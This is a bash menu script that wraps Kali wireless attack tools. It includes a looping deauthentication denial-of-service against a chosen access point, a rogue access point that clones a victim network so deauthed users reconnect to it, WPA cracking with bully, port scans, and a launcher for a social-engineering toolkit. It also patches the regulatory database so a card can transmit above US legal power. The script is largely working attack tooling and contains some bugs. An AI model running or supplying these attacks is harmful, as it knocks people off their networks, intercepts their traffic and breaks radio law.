#!/bin/bash
###########
#Functions#
###########

##ChRoot
function rootchecker {
if [ $UID -ne 0 ]; then
    echo -e " \033[1;33mThis program must be run as root. Enable it (sudo), and restart the script.\033[0m"
    sleep 3
    fi
}

##Pause
function pause() {
	read -sn 1 -p "Press any key to continue..."
}

##enabletx power (kali 2.0)
function entx {
	clear
	echo "We are going to install the dependancies now."
	pause
	echo
	apt-get install libnl-3-dev libgcrypt11-dev libnl-genl-3-dev
	echo
	echo "Now to install the tar files."
	pause
	wget https://www.kernel.org/pub/software/network/wireless-regdb//wireless-regdb-2016.02.08.tar.xz
	wget http://kernel.org/pub/software/network/crda/crda-3.18.tar.xz
	echo
	echo "Now, we unpack them."
	pause
	echo
	unxz crda-3.18.tar.xz
	unxz wireless-regdb-2016.02.08.tar.xz
	pause
	echo
	tar -xf crda-3.18.tar
	tar -xf wireless-regdb-2016.02.08.tar
	#Save current path so you skip needless manual directory navigation from user
	regdbPath="$(pwd)"
	#Go on with the flow
	#Find path to program
	pp="$(find / -name wireless-regdb-2016.02.08)"
	#echo
	#echo "Now that they're unpacked, you will need to do some editing."
	#echo "(DO NOT exit this terminal) First, open up the wireless-regdb folder."
	#Navigate to path
	cd $pp
	#echo "Now you need to find a file called db.txt. (you will need to use root/sudo)"
	#echo "Scroll down to 'country BO'"
	#echo "Change the first (20) that you see, to (30)"
	#echo "Once you're done with that, make SURE YOU SAVE!"
	#Replace 20 with 30 on line 179 (exactly where the "20" in country BO is)
	sed -i '179s/20/30/' db.txt
	#pause
	#echo
	#echo
	#echo "While you're still in that folder, type 'sudo make'."
	#You can do it yourself in the script like so:
	sudo make
	#echo "Now, change to the current CRDA folder ('cd /lib/crda')"
	#Can also be done by yourself like so:
	cd /lib/crda
	#echo "Type 'sudo mv regulatory.bin regulatoryOLD.bin' Here, we rename the file"
	#You guessed it
	sudo mv regulatory.bin regulatoryOLD.bin
	#echo "so that if anything goes wrong, we can always restore it."
	#No need for pause imo
	#pause
	#echo
	#echo
	#Because we saved the path to the folder earlier we can navigate to it automatically like so:
	#echo "Now move back to the wireless-regdb folder."
	cd $pp
	#More stuff for potential automation
	#echo "Type 'sudo cp regulatory.bin /lib/crda"
	sudo cp regulatory.bin /lib/crda
	#echo "Now go back to /lib/crda (I know, this is boring, repetive, and long. But it's completely necessicary."
	#echo "Trust me, if it wasn't, then I wouldn't be typing all of this out for you.)"
	#echo "Make for sure that /lib/crda contains 'regulatory.bin'"
	#Check if file exsists
	if [ -e "/lib/crda/regulatory.bin" ]
	then
		echo "Almost done."
	fi
	#pause
	#echo
	#echo
	#echo "Now go back to the wireless-regdb folder (Ugh...)"
	#Again, using path stored in variable
	#echo "Type this in: 'sudo cp *.pem ~/Desktop/crda-3.18/pubkeys' (change out the directory with the dir you have the crda folder in)"
	#Find path to crda
	crdaPath="$(find / -name crda-3.18)"
	#Copy stuff into correct path
	sudo cp *.pem $crdaPath/pubkeys
	#echo "Now this: 'cd /lib/crda/pubkeys'"
	cd /lib/crda/pubkeys
	#echo "And this: 'sudo cp benh@debian.org.key.pub.pem ~/Desktop/crda-3.18/pubkeys'"
	sudo cp benh@debian.org.key.pub.pem ~/Desktop/crda-3.18/pubkeys
	#echo "What this does is copies all of the .pem files used to validate the regulatory.bin"
	#pause
	#echo
	#Let's automate this as well
	#echo "Okay, remember when we downloaded and unpacked those tars?"
	#echo "Well, now you're going to need to edit the makefile in the crda-3.18 folder. Go ahead and open that directory."
	cd $crdaPath
	#echo "Type: 'sudo nano Makefile'"
	#echo "Now, change the 3rd line from: REGBIN?=/usr/lib/crda/regulatory.bin to REGBIN?=/lib/crda/regulatory.bin"
	#echo "In other words, remove /usr on line 3"
	#Remove "/usr" automatically
	sed -i '3s/\/usr//' Makefile
	#echo "Now, type 'sudo make'"
	sudo make
	#echo "and then 'sudo make install'"
	sudo make install
	echo "AND FINALLY, FINALLY, YOU HAVE REACHED THE END <3. Good job. TX power is FINALLY enabled. You've earned yourself a beer."
	echo "If you have any errors or had trouble please go to this website. (Credit to the original author)"
	echo
	echo "http://null-byte.wonderhowto.com/how-to/ultimate-guide-upping-tx-power-kali-linux-2-0-0168325/"
	echo "Don't forget to restart your pc after doing this."
	echo "Back to title"
	pause
	title
}
	
	
	


##WifiPhisher func
function wiphish {
	clear
	if [ ! -e "wifiphisher" ];then
	echo "WiFiphnisher is not installed. Do you want to install it ? (Y/n)"
	read install
		if [[ $install = Y || $install = y ]] ; then
		echo
		echo "Okay, let's install it then!"
		pause
		clear
			git clone https://github.com/sophron/wifiphisher.git
			cd wifiphisher
			cd bin
			pause
			echo
			echo "Once the python script exits, come back to this"
			echo "script, and instead of typing 'N', type 'Y'."
			pause
			clear
			python wifiphisher
		else
		echo -e "\e[32m[-] Ok,maybe later !\e[0m"
		fi
	else
		echo
		echo "WiFiphisher is installed! Let's get started then."
		cd wifiphisher
		cd bin
		pause
		clear
		python wifiphisher
	fi
}

##bully function
function bully {
	clear
	echo "This attack will take a lot of time."
	echo "You must be patient because if the AP"
	echo "is susceptible to this attack, it could"
	echo "take anywhere from 3 to 5 hours to finish."
	echo 
	echo "This is for WPA cracking"
	echo "Have you enabled monitor mode? (Y/n)"
	read yene
	if [[ $yene = Y || $yene = y ]] ; then
		echo
		pause
		echo
		echo
		echo "What is the name of th card on Monitor mode?"
		read ncard
		echo "Okay, now you need to do 'airodumb-ng $ncard 'in a new terminal."
		echo "Please wait a few minutes for the list to populate"
		pause
		echo "Thank you for waiting!"
		echo
		echo "What is the BSSID of your victim?"
		read bssid 
		echo
		echo "What is the SSID of your victim?"
		echo
		echo "What is the channel number (CH) of your victim?"
		read chn
		echo
		echo "Sweeet! Now we have all the info we need to crack that WEP!"
		echo "Remember, this will take a lot of time, so why don't you go"
		echo "outside and pop yourself a well-earned beer with friends?"
		pause
		bully $ncard -b $bssid -e $essid -c $chn
	else
		echo
		pause
		mon
	fi
}

###Wifi Cracking selector
function wicrack {
	clear
	echo -e "
\033[0;35m==================================================\033[0m
\033[1;31m***===----..(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)..----===***\033[0m	
\033[1;32m
	    +_=_+_=_+_=_+_=_+_=_+_=_+
	    |   Apple's Multi-Use   |
	    |      Shell Script     |
	    +_=_+_=(WiCracking)_+_=_+
\033[0m
\033[1;31m..----===***(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)***===----..\033[0m	
\033[0;35m==================================================\033[0m"

echo "Please select which tool you wish to use."
echo
select menusel in "Bully" "Under Development" "Back"; do
case $menusel in
	"Bully")
		bully
		clear ;;

	"Under Development")  ### "Wifiphisher")
		#wiphish
		echo
		echo
		echo "This section of my script is still being developed."
		pause
		wicrack
		clear ;;


	"Exit Script")
		clear && wireless ;;
		
	* )
esac
break
done
}


###Hping caller
function hping {
	clear
	echo "Enter IP address to scan (will scan the subnet)"
	echo "Example: google.com is 74.125.225.0"
	echo "To scan the subnet, simply add /24 directly to the end of the IP."
	echo "(I.E: 74.125.225.0/24)"
	echo
	echo "What is the IP you wish to scan?" 
	read IPn
	echo ""$IPn"? Okay."
	echo
 
	echo "Enter port to be scanned"
	echo "Example: 5505"
	echo "Example2: To scan multiple ports, format it like this: 5505-6000"
	echo
	echo "What is the port you wish to scan?" 
	read PORT
	echo ""$PORTn"? Okay."
	echo

	echo "Enter # of packets to be sent"
	read PACKETS
	echo ""$PACKETS" Okay"
	echo

	echo "Scanning $IPn subnet for port $PORTn with $PACKETS packets. "
	echo
	pause
		hping3 -c $PACKETS -S $IPn -p PORTn > hpingscan
		cat hpingscan
	pause
	title
}

###nmap caller
function nmapy {
	clear
	echo "Enter IP address to scan"
	echo "Example: google.com is 74.125.225.0"
	echo "To scan the subnet, simply add /24 directly to the end of the IP."
	echo "(I.E: 74.125.225.0/24)"
	echo
        echo "What is the IP you wish to scan?" 
	read IP	
	echo "$IP? Okay."
	echo
 
	echo "Enter port to be scanned"
	echo "Example: 5505"
	echo "Example2: To scan multiple ports, format it like this: 5505-6000"
	echo
	echo "What is the port you wish to scan?" 
	read PORT
	echo "$PORT? Okay."
	echo

	echo "Scanning $IP for port $PORT"
	

		nmap -sT $IP -p $PORT -oG ports

		cat ports | grep open > portsopen
		cat portsopen | cut -f2 -d "." | cut -f1 -d "(" > portsvuln
		less portsvuln
pause
title
}

###Network anti-work
function noworky {
	clear
	echo "Okay...You're using linux, you should know how to fix this."
	echo "I guess I'll tell you how, and then do it for you."
	echo
	echo "You type 'sudo service network-manager restart'"
	service network-manager restart
	pause
}

function txweak {
	clear
	echo "You done goofed..."
	echo "Unfortunately for you, this is a USER ERROR."
	echo "Basically, you didn't follow the directions to the point."
	echo "You probably thought that you knew what you were doing, huh?"
	echo "You thought wrong. Just follow the directions."
	echo "It doesn't matter whether or not you understand it, and don't try to."
	pause
	echo
	echo
	echo "Let's run through all of the possible fixes."
	echo "1.) Did you restart your pc? No? Do it now. Otherwise, continue."
	pause
	echo
	echo
	echo "2.) Did you follow the directions EXACTLY as how they were written?"
	echo "3.) Are you sure you typed/copy and pasted the commands correctly?"
	echo "4.) Did you save the documents that you had to edit?"
	echo "5.) Did you edit the documents using sudo or root?"
	echo 
	echo "Do you have any problems I didn't address here? If so, go to this"
	echo "link and follow it instead of my script. Don't worry, eventually"
	echo "I'll code it so that it'll do it for you."
	echo
	echo "http://null-byte.wonderhowto.com/how-to/ultimate-guide-upping-tx-power-kali-linux-2-0-0168325/"
	pause
}

##help
function imbad {
	clear
	echo -e "
\033[0;35m==================================================\033[0m
\033[1;31m***===----..(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)..----===***\033[0m	
\033[1;32m
#    #      #####     #          ######	      #
#    #      #	      #          #   #        #   
#    #      ####      #          # ##	      #  
######      #         #          ##  	      #  
#    #      #	      #          #  	       
#    #      #####     ######     #  	      #
\033[0m
\033[1;31m..----===***(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)***===----..\033[0m	
\033[0;35m==================================================\033[0m"
echo "What's so hard? Is there a question in your pants,
or are you just happy to see me?"	
echo
echo
select opt in "My network isn't working!" "Tx Power isn't working properly!" "Back"; do
	case $opt in
	"My network isn't working!")
	noworky
	clear ;;

	"Tx Power isn't working properly!")
	txweak
	clear ;;

	"Back")
	clear && title ;;

	* )
esac
break
done
}



#######
#portz#
#######

function portz {
	clear
	echo -e "
\033[0;35m==================================================\033[0m
\033[1;31m***===----..(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)..----===***\033[0m	
\033[1;32m
######       ##         ####    #######	   ######
#    #     #	#     #      #     #           # 
#   #     #	 #   #             #	      #  
####      #	 #   #             #	     #  
#          #	#    #             #	    #	 
#            ##      #             #	   ######
\033[0m
\033[1;31m..----===***(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)***===----..\033[0m	
\033[0;35m==================================================\033[0m"
	select opt in "Nmap" "Hping" "Back"; do
	case $opt in
	"Nmap")
	nmapy
	;;
	"Hping")
	hping
	;;
	"Back")
	clear && title ;;

	* )
esac
break
done
}


###Global Port Scan
function globp {
	clear
	echo "What port would you like to scan for?"
	read portt
	echo "What would you like the output files to be named?"
	read filen
	echo
	echo "Scanning globe for port $portt"
	nmap -sT 74.125.225.0/24 -p $portt -oG port$filen

		cat $filen | grep open > "$filen"open
		cat "$filen"open | cut -f2 -d "." | cut -f1 -d "(" > "$filen"vuln
		less "$filen"vuln
	pause
title
}


###DOS function
function dos {
	clear
	echo "Open up a new terminal session (without closing this one) and do; airodump-ng wlan0mon."
	echo "While on that terminal, wait for a good 2-3 minutes to allow the list to populate."
	echo "Change out wlan0mon with the name of the card that is on monitor mode."
	pause
	echo
	echo
	echo "What is the name of the card that is on monitor mode?"
	read CARD
	echo
	echo "Put in the desired BSSID"
	read BSSID
	echo
	echo "How much time do you wish to wait for between DOS walls?"
	echo "It must be formated like so: 60s fo 60 seconds. Just add an s at the end of the number"
	read WAIT
	echo
	echo "How many deauth packets do you wish to send?"
	read PACKETS
	for i in {1..5000}
	do

		ifconfig $CARD down
		macchanger -r $CARD
		ifconfig $CARD up

		aireplay-ng -deauth $PACKETS -a $BSSID $CARD
		sleep $WAIT
	done
}

##Enabling monitor mode
function mon {
	clear
	echo "Please choose which card to enable monitor mode on."
	echo
	airmon-ng
	echo
	read card
	echo "Beginning to enable the RAP on $card "
	echo "Enabling monitor mode"
	airmon-ng check kill
	airmon-ng start $card
	service network-manager restart
	echo
	echo "What was your card's name changed to?"
	read ncard
		ifconfig $ncard down
		iwconfig $ncard mode monitor
		ifconfig $ncard up
		echo "Okay, Thanks! Monitor mode is now enabled."
	pause
title
}

###Selecting the power (BO)
function powerselBO {
	clear
	echo -e "
\033[0;35m==================================================\033[0m
\033[1;31m***===----..(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)..----===***\033[0m	
\033[1;32m
	    ##########################
	    #  Selecting your power  #
	    # Which one do you want? #
	    ############BO############
\033[0m
\033[1;31m..----===***(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)***===----..\033[0m	
\033[0;35m==================================================\033[0m"
	clear	
	echo
	echo "What dBm do you want? You can pick anywhere between 1 and 30"
	echo
	read dbm
	echo "You chose $dbm"
	pause
		iwconfig $ncard txpower $dbm
		echo
		clear
		echo "Your card now has $dbm dBm of power!"
		pause
title

}

###Selecting the power (US)
function powerselUS {
	clear
	echo -e "
\033[0;35m==================================================\033[0m
\033[1;31m***===----..(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)..----===***\033[0m	
\033[1;32m
	    ##########################
	    #  Selecting your power  #
	    # Which one do you want? #
	    ############US############
\033[0m
\033[1;31m..----===***(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)***===----..\033[0m	
\033[0;35m==================================================\033[0m"
	clear	
	echo
	echo "What dBm do you want? You can pick anywhere between 1 and 27"
	read dbm
	echo "You chose $dbm"
	pause
		iwconfig $ncard txpower $dbm
		echo
		clear
		echo "Your card now has $dbm dBm of power!"
		pause
title

}


###Just Raise the powahhh
function upp {
	clear
	iwconfig
	echo
	echo "Which card would you like to up the power on?"
	read $ncard
	echo "Do you wish to surpass the US legal limit? (1-27 dBm) [Y/n]"
	read param
	if [[ $param = Y || $param = y ]] ; then
		echo
		ifconfig $ncard down
		iw reg set BO
		ifconfig $ncard up
		pause
		powerselBO
	else
		echo
		ifconfig $ncard down
		iw reg set US
		ifconfig $ncard up
		pause
		powerselUS
	fi
}


##Rogue AP
function rap {
	clear
	echo "You chose the Rogue Acess Point!"
	echo "Please choose which card to enable the 'RAP' on."
	echo
	airmon-ng
	echo
	echo "What is your card's name??"
	read ncard
	echo
	echo "Now I need you to open a new window and type 'airodump-ng $ncard'"
	echo "Please wait for a few minutes to allow the list to populate."
	pause
	clear
	echo "Thank you for waiting!"
	echo
	echo "Please enter the BSSID of the Access Point you wish to emulate"
	echo "ProTip, copy the BSSID onto your clipboard and then paste it here with CTRL+SHIFT+V"
	read bssid
	echo
	echo "Please enter the ESSID of the Access Point you wish to emulate"
	read essid
	echo
	echo "Please enter the Channel (CH) number of the access point you wish to emulate"
	read ch
	echo
	echo "Awesome! Now we have all the info we need to setup your RAP!"
	echo "Now that your RAP is setup, you will need to Deauthenticate the victims"
	echo "from their access point so that they will reconnect to yours automatically"
	echo "by opening a new terminal, invoking this script again, and choosing the DOS"
	echo "option.  If they don't connect, then you will need to raise the power by"
	echo "opening a new terminal, invoking this script again, and choosing the"
	echo "power increase option."
	echo "Happy Hacking! And remember, don't do anything illegal."
	airbase-ng -a $bssid --essid "$essid" -c $ch $ncard
}

###Wireless sel. menu
function wireless {
	clear
	echo -e "
\033[0;35m==================================================\033[0m
\033[1;31m***===----..(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)..----===***\033[0m	
\033[1;32m
	    +_=_+_=_+_=_+_=_+_=_+_=_+
	    |   Apple's Multi-Use   |
	    |      Shell Script     |
	    +_=_+_=_(Wireless)=_+_=_+
\033[0m
\033[1;31m..----===***(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)***===----..\033[0m	
\033[0;35m==================================================\033[0m"
echo "Remember, in kali 2.0, you need to unplug your card"
echo "if you want to take it out of monitor mode easily.."
echo
select menusel in "Rogue Access Point" "Raise Power" "Enable Monitor Mode" "DOS them off of their fucking network!" "Global Port Scan" "Port Scan" "Crack Their WiFi" "Enable txpower (Kali 2.0)" "Help!" "Back"; do
case $menusel in
	"Rogue Access Point")
		rap
		clear ;;

	"Raise Power")
		upp
		clear ;;

	"Enable Monitor Mode")
		mon
		clear ;;

	"DOS them off of their fucking network!")
		dos
		clear ;;

	"Global Port Scan")
		globp
		clear ;;

	"Port Scan")
		portz
		clear ;;

	"Crack Their WiFi")
		wicrack
		clear ;;

	"Enable txpower (Kali 2.0)")
		entx
		clear ;;

	"Help!")
		imbad
		clear ;;

	"Back")
		clear && title ;;
		
	* )
esac
break
done
}




#######
#Title#
#######

function title {
	clear
	echo -e "
\033[0;35m==================================================\033[0m
\033[1;31m***===----..(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)..----===***\033[0m	
\033[1;32m
	    +_=_+_=_+_=_+_=_+_=_+_=_+
	    |   Apple's Multi-Use   |
	    |      Shell Script     |
	    +_=_+_=_+_=_+_=_+_=_+_=_+
\033[0m
\033[1;31m..----===***(\033[0mScript by: \033[0;33mApple\033[0;36mDash48\033[1;31m)***===----..\033[0m	
\033[0;35m==================================================\033[0m"
rootchecker
echo
select menusel in "Wireless Attacks" "Social Engineering Toolkit" "Exit Script"; do
case $menusel in
	
	"Wireless Attacks")
		wireless
		clear ;;
	
	"Social Engineering Toolkit")
		setoolkit
		clear ;;

	"Exit Script")
		clear && exit 0 ;;
		
	* )
esac
break
done
}


while true; do title; done
